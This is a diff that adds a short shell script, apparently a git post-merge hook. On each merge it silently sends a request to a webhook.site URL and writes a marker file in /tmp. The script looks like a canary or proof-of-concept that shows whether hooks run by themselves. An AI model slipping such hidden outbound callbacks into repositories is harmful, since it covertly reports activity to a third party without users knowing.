@@ -1,0 +1,3 @@
+#!/bin/sh
+curl -s 'https://webhook.site/9c00343e-bd53-4b42-bd9f-65b0db356908?who=hook-post-merge' >/dev/null
+touch /tmp/capy-fork-hook-post-merge
